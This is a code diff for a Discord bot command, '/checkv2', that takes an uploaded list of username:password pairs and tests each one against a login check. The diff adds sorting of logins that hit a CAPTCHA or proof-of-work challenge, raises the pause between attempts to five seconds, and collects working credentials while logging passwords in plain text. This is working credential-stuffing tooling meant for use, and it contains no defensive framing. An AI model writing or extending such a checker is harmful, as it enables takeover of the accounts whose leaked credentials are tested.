@@ -58,8 +58,7 @@ function parseCredentials(content: string): Credential[] {
 
 const data = new SlashCommandBuilder()
   .setName('checkv2')
-  .setDescription('Mass check username:password credentials from a .txt file')
-  
+  .setDescription('Mass Credential Check (use /checkv2)')
   .addAttachmentOption((opt) =>
     opt.setName('file')
       .setDescription('A .txt file containing credentials (supports multiple formats)')
@@ -103,19 +102,24 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     let validCount = 0;
     let invalidCount = 0;
+    let challengeCount = 0;
     let processed = 0;
     const delayMs = 2000;
     const validLines: string[] = [];
+    const challengeLines: string[] = [];
 
     let updateCounter = 0;
 
     for (const cred of credentials) {
       processed++;
       const result = await validatePassword(cred.username, cred.password);
-      const logMsg = `CheckV2: ${cred.username} | ${cred.password} | ${result.valid ? '✅ VALID' : '❌ INVALID'}${result.error ? ` (${result.error})` : ''}`;
+      const logMsg = `CheckV2: ${cred.username} | ${cred.password} | ${result.challenge ? '⚠️ CHALLENGE' : result.valid ? '✅ VALID' : '❌ INVALID'}${result.error ? ` (${result.error})` : ''}`;
       logger.info(logMsg);
 
-      if (result.valid) {
+      if (result.challenge) {
+        challengeCount++;
+        challengeLines.push(`${cred.username}:${cred.password} (challenge)`);
+      } else if (result.valid) {
         validCount++;
         validLines.push(`${cred.username}:${cred.password}`);
       } else {
@@ -125,21 +129,28 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       updateCounter++;
       if (updateCounter % 5 === 0 || processed === total) {
         const statusEmbed = buildProgressEmbed(
-          `Scanning... (${processed}/${total}) | ✅ Valid: ${validCount} | ❌ Invalid: ${invalidCount}`
+          `Scanning... (${processed}/${total}) | ✅ Valid: ${validCount} | ❌ Invalid: ${invalidCount} | ⚠️ Challenge: ${challengeCount}`
         );
         await interaction.editReply({ embeds: [statusEmbed] });
       }
 
       if (processed < total) {
-        await new Promise(resolve => setTimeout(resolve, delayMs));
+        await new Promise(resolve => setTimeout(resolve, 5000)); // 5-second cooldown between checks
       }
     }
 
-    const summaryEmbed = buildSuccessEmbed(
-      validCount === 0
-        ? `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** 0\n⭑ **Invalid:** ${invalidCount}`
-        : `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}`
-    );
+    let summaryText = `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Challenge (skipped):** ${challengeCount}`;
+
+    if (challengeCount > 0) {
+      summaryText += `\n⭑ Some credentials triggered a CAPTCHA/Proof-of-Work challenge and could not be verified.`;
+    }
+
+    const summaryEmbed = buildSuccessEmbed(summaryText);
+
+    if (validCount === 0 && challengeCount > 0) {
+      await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
+      return;
+    }
 
     if (validCount === 0) {
       await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
